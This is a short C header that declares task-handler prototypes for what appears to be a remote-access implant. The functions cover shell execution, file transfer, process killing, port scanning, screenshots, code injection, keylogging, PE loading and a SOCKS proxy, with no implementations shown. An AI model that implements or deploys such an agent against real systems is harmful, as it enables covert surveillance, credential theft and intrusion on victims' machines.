#ifndef ARK_TASK_HANDLERS_H
#define ARK_TASK_HANDLERS_H

#include <stddef.h>
#include <stdint.h>

int ark_task_shell_execute(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_file_download(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_file_upload(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_process_list(uint8_t **out, size_t *out_len);
int ark_task_process_kill(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_net_ifconfig(uint8_t **out, size_t *out_len);
int ark_task_net_portscan(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_screenshot(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_inject(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_keylog_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_keylog_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_keylog_dump(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_peload(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_socks_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_socks_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);
int ark_task_module(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len);

#endif